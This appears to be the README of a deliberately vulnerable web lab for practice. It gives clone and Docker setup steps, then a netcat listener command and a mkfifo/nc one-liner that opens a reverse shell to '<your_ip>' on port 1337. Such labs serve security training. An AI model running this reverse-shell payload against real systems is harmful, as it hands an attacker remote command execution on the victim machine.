# Web-vuln

## Building the application

Clone the repository 

```
git clone git@github.com:jphetphoumy/Web-vuln.git
```

Run the docker environment

```
cd web1
docker-compose up -d
```

Access to your vulnerable env at `http://localhost:8080`

Open a reverse shell on your pc :

```
nc -l 1337
```

Run a reverse shell 

```
mkfifo pipe; nc -nv <your_ip> 1337 < pipe | /bin/sh 2>pipe >pipe
```
